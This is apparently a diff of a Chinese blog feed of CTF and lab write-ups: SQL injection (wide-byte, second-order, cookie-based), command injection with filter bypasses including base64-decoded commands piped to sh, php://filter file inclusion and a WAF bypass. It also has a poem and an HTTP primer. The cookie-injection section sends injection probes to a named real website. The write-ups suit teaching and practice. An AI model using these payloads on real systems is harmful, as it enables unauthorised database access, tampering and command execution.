+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%df&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
+
+<p>顺利地得到了预期的内容：</p>
+<img src="https://i.loli.net/2021/02/26/bRY8QhXeal6gqtH.png" alt="image-20210226000350800" style="zoom:33%;" />
+
+<p>同样的将payload换为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%df&#39; union select database(),2 #</span><br></pre></td></tr></table></figure>
+
+<p>成功获得库名，将select语句换为其他语句，便可以按照sql注入的一般流程进行一步步地注入</p>
+<h2 id="8、二次注入"><a href="#8、二次注入" class="headerlink" title="8、二次注入"></a>8、二次注入</h2><p>二次注入的诱发因素也是因为一些转义函数，在我们输入带有如单引号<code>&#39;</code>的字符串时，将这些符号转义，在第一次插入SQL语句的时候，无法构成闭合，但是这一字符串在储存进数据库时，并不会将转义符反斜杠<code>\</code>一起储存进去，所以此时在数据库中储存着的字符串是一个脏字符串，当我们第二次调用这个字符串时，就可以对数据库进行攻击，以下是一个二次注入的实例：</p>
+<img src="https://i.loli.net/2021/03/01/oOy84mcRBUv5NHI.png" alt="image-20210301192452726" style="zoom: 33%;" />
+
+<p>这是靶场sqli-labs中的第24关，借助数据库管理工具我们可以事先看到数据表：</p>
+<img src="https://i.loli.net/2021/04/30/3aEWZxujCSdfn2y.png" alt="image-20210301193225915" style="zoom: 80%;" />
+
+<p>其中用户Dummy的密码为p@ssword，这时候我们进入创建用户页面，提交payload如下图所示：</p>
+<img src="https://i.loli.net/2021/04/30/i1cKDAhuQvI9LSj.png" alt="image-20210301193505011" style="zoom:80%;" />
+
+<p>此时我们发现名为<code>Dummy&#39;#</code>的用户名已经被插入数据库：</p>
+<p><img src="https://i.loli.net/2021/03/01/Eo6QUMWFgHqmwZ1.png" alt="image-20210301193619658"></p>
+<p>其中的单引号在第一次连接如sql语句时并没有构成闭合，应该是经过了转义函数的转义，但是转义字符并没有跟随着插入数据库中，此时我们尝试二次调用这个用户：</p>
+<p><img src="https://i.loli.net/2021/03/01/hzDUq1eLp79bONf.png" alt="image-20210301193829411"></p>
+<p>然后我们再次查看后台数据库，发现<code>Dummy&#39;#</code>的密码并没有被修改，反而Dummy的密码被修改了，这样攻击者就达到了攻击数据库并且对其中的用户信息进行恶意篡改的目的</p>
+<p><img src="https://i.loli.net/2021/03/01/MrHtDXQYAJUCVm4.png" alt="image-20210301193918611"></p>
+<h2 id="9、cookie注入"><a href="#9、cookie注入" class="headerlink" title="9、cookie注入"></a>9、cookie注入</h2><p>首先介绍cookie的定义：</p>
+<p><strong>Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息</strong></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在ASP中，request对象获取客户端提交数据常用的是get和post两种方式，同时request对象可以不通过集合来获得数据,即直接使用”request(“name”)”。但它效率低下，容易出错，当我们省略具体的集合名称时，asp是按<code>QueryString(get)</code>、<code>Form(post)</code>、<code>Cookie</code>、<code>Severvariable</code>、集合的顺序来搜索的。cookie是保存在客户端的一个文本文件，可以进行修改，这样一来，就可以利用Request.cookie方式来提交变量的值，从而进行注入攻击。</p>
+<h3 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h3><p>首先我们需要找到一个注入点，我们是使用get方式提交的参数，要更改成cookie方式提交，我们首先要访问正常的存在注入点的页面，等页面完全打开之后，我们将IE地址栏清空，然后写上:javascript:alert(document.cookie=”id=”+escape(“x”)); 这里的“id=”便是“注入点中id=x”中的“id=”，“escape(“x”)”中的“x”是“id=x”中的“x”了，这两处要根据实际情况来定义。写完之后按下回车网页中会弹出一个对话框。</p>
+<p>更改好了cookie后我们就要试下能不能正常访问了，在另外一个窗口中重新打开那个注入点既是将“id=x”去掉后的，然后看是否能正常访问。</p>
+<p>如果去掉之后能够继续访问 那么说明可以进行cookie注入，这样就说明程序在使用request对象获取数据的时候并未指明具体使用什么方法来获取，而是直接使用request(“xx”)的方式。cookie形成的一个重要因素已经明确了，接下来我们测试下能否提交特殊字符，看程序是否对数据进行过滤。比如著名的单引号测试法，当然也就可以在语句上添加上手工注入的语句，达到绕过拦截的目的</p>
+<p><strong>以下是cookie注入的一个实例：</strong></p>
+<p>有漏洞的网站的url为：<a href="http://minlue.com/product_list.asp%EF%BC%8C%E8%BF%9B%E5%85%A5%E7%BD%91%E7%AB%99%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E7%8C%9C%E6%B5%8Bsmallclass%E4%B8%BA%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C">http://minlue.com/product_list.asp，进入网站，我们可以猜测smallclass为注入点，</a></p>
+<p><img src="https://i.loli.net/2021/03/01/roeI6MZTLR7z452.png" alt="image-20210301201059745"></p>
+<p>当我们尝试对该注入点进行一般注入的时候，发现页面进行了过滤：</p>
+<img src="https://i.loli.net/2021/03/01/U2Bq8t36OcWf4DX.png" alt="image-20210301201356949" style="zoom:50%;" />
+
+<p>于是采取cookie注入：</p>
+<p>首先将url改为：<code>javascript:alert(document.cookie=&quot;smallclass=&quot;+escape(&quot;147&quot;));</code></p>
+<p>发现页面出现弹窗，页面刷新之后网站显示正常，我们进行进一步测试，分别提交payload：</p>
+<p><code>javascript:alert(document.cookie=&quot;smallclass=&quot;+escape(&quot;147 and 1=1&quot;));</code></p>
+<p><code>javascript:alert(document.cookie=&quot;smallclass=&quot;+escape(&quot;147 and 1=2&quot;));</code></p>
+<p>在显示弹窗之后分别刷新页面，发现前者可以正常显示页面，但是后者便无法正常得到回显，此时便可以确定可以进行cookie注入，网站程序是通过request(“id”)方式获取客户端提交的数据，并且在防注入程序中没有对通过request.cookies方式提交的数据进行过滤。</p>
+<p>由于无法确定这个网站的安全性，我们在自己的靶场上进行cookie注入的尝试，在靶场sqli-labs中的第20关为cookie注入，如下图所示：</p>
+<p>在登陆框中尝试使用用户名admin以及密码123456，登陆成功，于是可以发现注入点为uname：</p>
+<p><img src="https://i.loli.net/2021/03/01/cL4g3HvGuxTCNQX.png" alt="image-20210301204335753"></p>
+<p>分别提交payload：</p>
+<p><code>javascript:alert(document.cookie=&quot;uname=&quot;+escape(&quot;&#39; and 1=1&quot;));</code></p>
+<p><code>javascript:alert(document.cookie=&quot;uname=&quot;+escape(&quot;&#39; and 1=2&quot;));</code></p>
+<p>刷新后发现页面分别返回正确和错误，然后按照一般注入的流程进行注入：</p>
+<p><code>javascript:alert(document.cookie=&quot;uname=&quot;+escape(&quot;&#39; order by 3#&quot;));</code></p>
+<p>得以确定主查询语句的查询数量为3</p>
+<p><code>javascript:alert(document.cookie=&quot;uname=&quot;+escape(&quot;&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&quot;));</code></p>
+<p>爆出了表名<img src="https://i.loli.net/2021/03/01/eaJ571WG9IFQNV2.png" alt="image-20210301205848390"></p>
+<p>（本人最开始测试的时候payload为<code>javascript:alert(document.cookie=&quot;uname=&quot;+escape(&quot;admin&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&quot;));</code>，但是回显页面中只能爆出admin的用户名、id与密码，后来想可能是因为回显语句所能回显的信息有限，只能回显主查询语句的查询结果，所以将admin改为空，顺利爆出了库名）</p>
+<p>接下来的脱库操作便按照基本流程进行即可</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【ACTF2020 新生赛】Exec</title>
+    <url>/2021/04/30/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DExec/</url>
+    <content><![CDATA[<h3 id="ACTF2020-新生赛-Exec（ping）"><a href="#ACTF2020-新生赛-Exec（ping）" class="headerlink" title="[ACTF2020 新生赛]Exec（ping）"></a>[ACTF2020 新生赛]Exec（<code>ping</code>）</h3><p>首先介绍基础知识：</p>
+<p><strong>（1）linux管道符</strong></p>
+<p>管道符可以按照对应的逻辑关系对两个命令进行连接，常见的管道符如下所示：</p>
+<table>
+<thead>
+<tr>
+<th>管道符</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>`</td>
+<td>`</td>
+</tr>
+<tr>
+<td>`</td>
+<td></td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>按位与：前后语句都要执行，不管真假</td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>逻辑与：如果前面语句为假则不管后面的语句，否则执行后面的语句</td>
+</tr>
+<tr>
+<td><code>;</code></td>
+<td>在linux之下可以实现与&amp;一样的作用</td>
+</tr>
+</tbody></table>
+<p><strong>（2）ping</strong></p>
+<p>ping用于确定本地主机是否能与另一台主机成功交换(发送与接收)数据包，再根据返回的信息，就可以推断TCP/IP参数是否设置正确，以及运行是否正常、网络是否通畅等。</p>
+<p>回到本题：因为题目中的页面进行了一个ping查询，所以直接在后面使用管道符（此处使用按位或<code>|</code>）直接连接读取flag的语句，此处使用<code>cat /flag</code>进行查询，所以payload为：</p>
+<p><code>127.0.0.1 | cat /flag</code>，直接可以获取flag</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>linux管道符</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【ACTF2020 新生赛】Include</title>
+    <url>/2021/04/30/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DInclude/</url>
+    <content><![CDATA[<h3 id="BUUCTF-ACTF2020-新生赛-Include"><a href="#BUUCTF-ACTF2020-新生赛-Include" class="headerlink" title="BUUCTF-[ACTF2020 新生赛]Include"></a>BUUCTF-[ACTF2020 新生赛]Include</h3><p>基础知识：<code>php://filter</code></p>
+<p><code>php://filter</code>可以作为一个<strong>中间流</strong>来处理其他流，具有四个参数：</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td>指定了你要筛选过滤的数据流</td>
+<td>必选</td>
+</tr>
+<tr>
+<td>read=&lt;读链的筛选列表&gt;</td>
+<td>可以设定一个或多个过滤器名称，以管道符（|）分隔</td>
+<td>可选</td>
+</tr>
+<tr>
+<td>write=&lt;写链的筛选列表&gt;</td>
+<td>可以设定一个或多个过滤器名称，以管道符（|）分隔</td>
+<td>可选</td>
+</tr>
+<tr>
+<td>&lt;；两个链的筛选列表&gt;</td>
+<td>任何没有以read=或write=作前缀的筛选器列表会视情况应用于读或写链</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>如下方代码所示：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这里没有指定过滤器</span></span><br><span class="line">readfile(<span class="string">&quot;php://filter/resource=example.etc&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>以上的代码将会通过中间流输出对应的<code>example.etc</code>文件的内容</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">readfile(<span class="string">&quot;php://filter/read=convert.base64-encode/resource=example.etc&quot;</span>);</span><br><span class="line">readfile(<span class="string">&quot;php://filter/read=string.toupper/resource=example.etc&quot;</span>);</span><br><span class="line">readfile(<span class="string">&quot;php://filter/read=string.toupper|string.rot13/resource=example.etc&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>以上三行代码分别会实现这些功能：（1）将对应的文件进行base64编码之后输出（2）将对应的文件转换为大写后输出（3）将对应的文件转换为大写并且使用rot13编码后输出</p>
+<p>回到问题本身，我们的目的是读取<code>flag.php</code>的源码，但是在url中直接对该文件进行访问无法得到结果，估计是后台将该文件的源码进行了执行，而并非将文件源码输出</p>
+<p>同时文件名的提交方式为get，所以我们猜测后台中有文件包含漏洞，需要想办法得到对应文件的源码，所以采用<code>php://filter</code>，将文件<code>flag.php</code>进行base64编码之后输出，提交的payload为：</p>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code>，所得到的返回值如下图所示：</p>
+<p><img src="https://i.loli.net/2021/04/14/O3JpNajtBmyPceE.png" alt="image-20210414002440892"></p>
+<p>将该返回值进行base64解码得到flag</p>
+<p><img src="https://i.loli.net/2021/04/14/AcFTl17GQ9pxmyV.png" alt="image-20210414002933368"></p>
+<p>查看源码发现的确是对这个<code>flag.php</code>进行了执行，但是我们需要的flag却是在注释之中</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>文件包含漏洞</tag>
+        <tag>waf绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【GXYCTF2019】Ping Ping Ping</title>
+    <url>/2021/04/30/%5BGXYCTF2019%5DPing%20Ping%20Ping/</url>
+    <content><![CDATA[<h3 id="GXYCTF2019-Ping-Ping-Ping（过滤绕过）"><a href="#GXYCTF2019-Ping-Ping-Ping（过滤绕过）" class="headerlink" title="[GXYCTF2019]Ping Ping Ping（过滤绕过）"></a>[GXYCTF2019]Ping Ping Ping（<code>过滤绕过</code>）</h3><p>进入题目页面，看到题目中有提示，让我们提交一个<code>ip</code>，于是以<code>get</code>的方式提交<code>ip=1</code>：</p>
+<p><img src="https://i.loli.net/2021/04/18/FlCQN7jSKMb8nWJ.png" alt="image-20210418084416901"></p>
+<p>发现后台执行了ping命令，尝试使用刚刚学的管道符连接其他的查询语句<code>/?ip=1;ls</code>：</p>
+<p><img src="https://i.loli.net/2021/04/18/MwuXvjK2QF4bnTd.png" alt="image-20210418084548457"></p>
+<p>发现了两个php文件，首先我们尝试直接用cat命令来读取flag<code>/?ip=1;cat flag.php</code></p>
+<p><img src="https://i.loli.net/2021/04/18/vs7YQ8eo4ySLq63.png" alt="image-20210418104750439"></p>
+<p>显示fxck我的空格，可能意思是将空格过滤了，对于绕过空格过滤（在系统命令中），有以下几种方式：</p>
+<p><strong>（1）Linux下</strong></p>
+<table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>具体用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$&#123;IFS&#125;</code>或<code>$IFS$1</code></td>
+<td><code>Internal Field Separator （内部字段分隔符）</code>这是一个shell中的环境变量，可以起到充当分隔符的作用，直接在指令中填充充当空格，如果花括号被过滤，可以考虑使用第二种，其第二个$后的数字1可以换成其他数字</td>
+</tr>
+<tr>
+<td><code>&lt;&gt;</code>或<code>&lt;</code></td>
+<td>用于在命令与对象之间进行连接，直接在指令中填充充当空格</td>
+</tr>
+<tr>
+<td>使用转义符来绕过</td>
+<td>在提交payload时，其中的<code>%20</code>、<code>\0x20</code>、<code>%09（换行符）</code>都可以实现空格的功能或者替代（需要php环境）</td>
+</tr>
+</tbody></table>
+<p><strong>（2）windows下</strong></p>
+<p>在windows下，可以使用type来代替需要空格的命令，比如<code>type,flag.txt</code>或者<code>type.\flag.txt</code></p>
+<p>我们首先使用<code>$&#123;IFS&#125;</code>对空格进行绕过，payload为：<code>/?ip=1;cat$&#123;IFS&#125;flag.php</code></p>
+<p>显示fxck我的symbol，可能是对标点符号进行了过滤，可以考虑使用<code>$IFS$1</code>，<code>/?ip=1;cat$IFS$1flag.php</code>，显示fxck我的flag，这时候想到还可以试着去查看index.php，尝试对其进行查看：<code>/?ip=1;$IFS$1&#123;IFS&#125;index.php</code>，爆出了后台的源代码，如下图所示：</p>
+<p><img src="https://i.loli.net/2021/04/18/W3NqnTK9YhAmfoU.png" alt="image-20210418132226538"></p>
+<p>可以看到，后台对标点符号、空格、bash以及flag进行了过滤，注意该处对flag的过滤，只要提交的payload中含有这四个字符并且顺序与之相对就会被过滤，所以说使用一些字符将flag进行隔断的绕过方式就无法实现了，这时候我们可以考虑以下两种解决方式</p>
+<p><strong>（1）内联执行绕过</strong></p>
+<p>将要查询的文件名以不同的变量的形式进行代替，然后再在查询语句之中用变量来代替查询语句中的部分，比如：<code>/?ip=1;a=ag;b=fl;cat$IFS$1$b$a.php</code>，首先令<code>a</code>为<code>&#39;ag&#39;</code>，<code>b</code>为<code>fl</code>，然后在后方的查询语句之中可以直接用对应的变量来代替会被过滤掉的flag，使用该方式，在页面源代码中顺利地找到了flag</p>
+<p><strong>（2）base64编码绕过</strong></p>
+<p>可以将指令进行base64进行编码，其payload为：<code>/?ip=1;echo$IFS$1Y2F0IGZsYWcucGhwCg==|base64$IFS$1-d|sh</code>等效于<code>/?ip=1;echo Y2F0IGZsYWcucGhwCg==|base64 -d|sh</code>，而其中<code>Y2F0IGZsYWcucGhwCg==</code>便是查询语句<code>cat flag.php</code>的base64编码，使用该编码可以绕过基于字符匹配的过滤</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>waf绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【RoarCTF 2019】Easy Calc</title>
+    <url>/2021/04/30/%5BRoarCTF%202019%5DEasy%20Calc/</url>
+    <content><![CDATA[<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>打开环境发现是一个计算器，查看源码发现是向后端的<code>calc.php</code>提交了参数<code>num</code>，直接去查看<code>calc.php</code>的内容：</p>
+<p><img src="https://i.loli.net/2021/04/19/i1pbRyT9LQOklXG.png" alt="image-20210419120741589"></p>
+<p>尝试提交<code>num</code>，当提交的<code>num</code>为简单的四则运算式时，可以实现计算，但是如果说提交的是字母或是其他字符，则会被waf拦截，这时候可以利用php的字符串解析特性绕过waf，即如果payload为：<code>/?%20num=xxx</code>时，php会默认删除空格等同于<code>/?num=xxx</code>，但是waf会认为你没有传参（waf找不到<code>num</code>这个变量了，因为此时我们提交的变量名为<code> num</code>，但是php会在解析过程中将），参数被空格所截断，这样可以绕过waf检测</p>
+<p>提交payload为<code>/?%20num=phpinfo()</code>，成功地显示出了phpinfo信息，此时可以尝试获取当前目录中的文件和目录名称，使用<a href="https://www.w3school.com.cn/php/func_directory_scandir.asp">scandir</a>函数，<code>scandir(/)</code>即显示当前目录中的内容，并且使用<code>var_dump</code>进行输出，提交payload为<code>/?%20num=var_dump(scandir(/))</code>，但是被waf拦截了，发现斜杠<code>/</code>被过滤了，<strong>可以使用<code>ch(47)</code>来代替斜杠从而绕过过滤</strong>：</p>
+<p>最终payload为：<code>/?%20num=var_dump(scandir(chr(47)))</code></p>
+<p><img src="https://i.loli.net/2021/04/19/f2Lp98OSC4hwEx3.png" alt="image-20210419143418767"></p>
+<p>发现了名为<code>f1agg</code>的文件，尝试使用<a href="https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">file_get_contents</a>函数来读取flagg文件的信息，首先提交payload：</p>
+<p><code>/?%20num=var_dump(file_get_contents(/f1agg))</code>发现返回值为错误，考虑到f1agg可能被过滤了，同样使用<code>chr()</code>来进行绕过，提交payload：</p>
+<p><code>/?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
+<p>可以得到flag</p>
+<p><strong>本题总结：</strong></p>
+<p><strong>（1）使用在提交参数名之前加上空格可以绕过对提交的参数的waf（空格截断）</strong></p>
+<p><strong>（2）使用<code>chr()</code>来代替对应的字符来绕过waf</strong></p>
+<p><strong>（3）waf不一定是由php写的，所以可以使用一些语法上的差异来绕过</strong></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>waf绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【极客大挑战2019】SecretFile</title>
+    <url>/2021/04/30/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DSecret%20File/</url>
+    <content><![CDATA[<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>打开页面直接<code>f12</code>寻找页面源代码，</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;master&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./Archive_room.php&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;</span>&gt;</span>Oh! You found me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>打开<code>./Archive_room.php</code>，发现页面中有一个按钮，点击进入了一个新的页面，页面中显示<em>“查阅结束，如果没看清回去仔细看看”</em>，于是回到原来的页面查看源代码，发现按钮指向的其实是<code>./action.php</code>，而并非<code>./end.php</code>，所以可能是一访问前者，就跳转到了后者，使用burpsuite对其抓包：</p>
+<p><img src="https://i.loli.net/2021/04/16/rclRG9wbtiS8yjd.png" alt="image-20210416220129540"></p>
+<p>发现了<code>./action.php</code>的真正内容，访问<code>./secr3t.php</code>，页面源代码被直接显示出来：</p>
+<p><img src="https://i.loli.net/2021/04/16/2d7HAfcUGeJWqbm.png" alt="image-20210416220417361"></p>
+<p>首先按照注释中的提示访问<code>./flag.php</code>：</p>
+<p><img src="https://i.loli.net/2021/04/16/ivKkIeySNCst4cb.png" alt="image-20210416220520050"></p>
+<p>可以确定flag就在<code>flag.php</code>中，首先怀疑前端对输出的内容进行了过滤，查看源代码之后发现并没有，因为前几天刚刚写过另一道题（<a href="https://blog.csdn.net/yu748913833/article/details/115683384">详情见此</a>）中，flag被藏在了<code>flag.php</code>中的注释中，访问<code>flag.php</code>时只会将其当作代码执行。</p>
+<p>查看<code>./secr3t.php</code>爆出的源代码，考虑从文件包含漏洞来入手，如上图所示后端对payload进行了一些过滤，但是没有过滤刚刚学的<code>php://fileter</code>，于是现学现卖，构造payload来获取<code>flag.php</code>的源代码：</p>
+<p><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
+<p>返回了源代码经过base64加密之后的密文，使用base64进行解密，成功得到了flag</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>文件包含漏洞</tag>
+        <tag>waf绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/04/29/hello-world/</url>
+    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">春江潮水连海平，海上明月共潮生。</span><br><span class="line">滟滟随波千万里，何处春江无月明！</span><br><span class="line">江流宛转绕芳甸，月照花林皆似霰；</span><br><span class="line">空里流霜不觉飞，汀上白沙看不见。</span><br><span class="line">江天一色无纤尘，皎皎空中孤月轮。</span><br><span class="line">江畔何人初见月？江月何年初照人？</span><br><span class="line">人生代代无穷已，江月年年望相似。</span><br><span class="line">不知江月待何人，但见长江送流水</span><br><span class="line">白云一片去悠悠，青枫浦上不胜愁。</span><br><span class="line">谁家今夜扁舟子？何处相思明月楼？</span><br><span class="line">可怜楼上月裴回，应照离人妆镜台。</span><br><span class="line">玉户帘中卷不去，捣衣砧上拂还来。</span><br><span class="line">此时相望不相闻，愿逐月华流照君。</span><br><span class="line">鸿雁长飞光不度，鱼龙潜跃水成文。</span><br><span class="line">昨夜闲潭梦落花，可怜春半不还家。</span><br><span class="line">江水流春去欲尽，江潭落月复西斜。</span><br><span class="line">斜月沉沉藏海雾，碣石潇湘无限路。</span><br><span class="line">不知乘月几人归，落月摇情满江树。</span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>http简介</title>
+    <url>/2021/04/29/htttp%E7%AE%80%E4%BB%8B/</url>
+    <content><![CDATA[<h2 id="1、什么是http？"><a href="#1、什么是http？" class="headerlink" title="1、什么是http？"></a>1、什么是http？</h2><p>http（Hyper Text Transfer Protocol），即超文本传输协议，是web所使用的一种完成从客户端到服务器端等一系列运作流程的作为规范的协议，<strong>web是建立在http协议上进行通信的</strong></p>
+<span id="more"></span>
+
+<h3 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h3><p>通常使用的网络（包括互联网），是在TCP/IP协议族的基础上运作的。而http属于其内部的一个子集。计算机与网络设备要互相通信，双方就必须基于相同的方法。比如，如何探测到通信目标、有哪一边先发起通信、怎样结束通信等规则都需要事先确定，不同的硬件、操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称作<strong>协议（protocol）</strong>，其中存在各式各样的内容，从电缆的规格到IP地址的选定方法，寻找异地用户的方法、双方建立通讯的顺序，以及web页面显示需要处理的步骤，等等</p>
+<p>像这样把与互联网相关连的协议集合起来总称为<strong>TCP/IP</strong></p>
+<h3 id="TCP-IP分层管理"><a href="#TCP-IP分层管理" class="headerlink" title="TCP/IP分层管理"></a>TCP/IP分层管理</h3><p>TCP/IP协议族按照层次分别分为：<strong>应用层、传输层、网络层和数据链路层</strong>，将其层次化的好处在于当某个地方需要改变设计时，只需要把变动的层替换或者改变，并不需要对别的层的内容进行影响。层次化之后设计也变得相对简单，处于应用层上的应用可以只考虑分派给自己的任务，并不需要弄清别的任务</p>
+<p>利用TCP/IP协议族进行网络通信时，会通过分层顺序与对方通信，发送端从应用层往下走，接收端则从链路层往上走，如下图所示：</p>
+<p><img src="https://i.loli.net/2021/04/24/86aYq4TB3eAWVpE.png" alt="image-20210424173418598"></p>
+<h3 id="与http关系密切的协议：IP、TCP和DNS"><a href="#与http关系密切的协议：IP、TCP和DNS" class="headerlink" title="与http关系密切的协议：IP、TCP和DNS"></a>与http关系密切的协议：IP、TCP和DNS</h3><h4 id="（1）负责传输的IP协议"><a href="#（1）负责传输的IP协议" class="headerlink" title="（1）负责传输的IP协议"></a>（1）负责传输的IP协议</h4><p>IP网络协议位于网络层，作用是把各种数据包传送给对方，而要保证确实传送到对方那里，则需要满足各类条件。其中两个重要的条件是IP地址（指明了节点被分配到的地址）以及MAC地址（网卡所属的固定地址），IP地址可以与MAC地址进行配对，前者可以变换，后者基本不会更改</p>
+<h4 id="（2）确保可靠性的TCP协议"><a href="#（2）确保可靠性的TCP协议" class="headerlink" title="（2）确保可靠性的TCP协议"></a>（2）确保可靠性的TCP协议</h4><p>TCP位于传输层，提供可靠的字节流服务，使用<a href="https://baike.baidu.com/item/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B/5111559?fr=aladdin">三次握手</a>策略确保数据送达目标</p>
+<h4 id="（3）负责域名解析的DNS服务"><a href="#（3）负责域名解析的DNS服务" class="headerlink" title="（3）负责域名解析的DNS服务"></a>（3）负责域名解析的DNS服务</h4><p>DNS位于应用层，它提供域名到IP地址之间的解析服务</p>
+<p><em>各种协议与http协议的关系如下</em></p>
+<p><img src="https://i.loli.net/2021/04/24/ZES9I57iUhQlC1H.png" alt="image-20210424175706525"></p>
+<h2 id="2、告知服务器意图的http方法"><a href="#2、告知服务器意图的http方法" class="headerlink" title="2、告知服务器意图的http方法"></a>2、告知服务器意图的http方法</h2><p>在客户端试图与服务端达成通信时，需要告诉服务器以意图，在url中需要使用一些方法来告知意图，以下是一些方法及其对应的用途：</p>
+<h3 id="GET：获取资源"><a href="#GET：获取资源" class="headerlink" title="GET：获取资源"></a>GET：获取资源</h3><p>GET方法用来请求访问已被URI识别的资源，指定的资源经服务器端解析后返回响应内容。如果请求的资源是文本那就保持原样返回，如果是像GCI那样的程序，那就返回执行后的输出结果，以下是使用GET方法进行请求及其相应的例子</p>
+<p>如请求：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.hackr.jp</span><br></pre></td></tr></table></figure>
+
+<p>其响应为：返回<code>index.html</code>的页面资源</p>
+<p>如请求：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Host:www.hackr.jp</span><br><span class="line">If-Modified-Since:Thu, 12 Jul 2012 07:30:00 GMT</span><br></pre></td></tr></table></figure>
+
+<p>其响应为：进返回2012年7月12日7点30分以后更新过的<code>index.html</code>页面资源。如果未有内容更新，则以状态码304 Not Modified作为响应返回</p>
+<h3 id="POST：传送实体主体"><a href="#POST：传送实体主体" class="headerlink" title="POST：传送实体主体"></a>POST：传送实体主体</h3><p>POST方法用来传输实体的主体，虽然用GET方法也可以传输尸体的主体，但一般不用GET方法进行传输，而是用POST方法。虽说POST的功能与GET很相似，但是POST的主要目的并不是获取响应返回，以下是使用POST方法进行请求及响应的例子</p>
+<p>请求：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/submit.cgi</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.hackr.jp</span><br><span class="line">Content-Length:1560</span><br></pre></td></tr></table></figure>
+
+<p>其相应为：返回submit.cgi接收数据的处理结果</p>
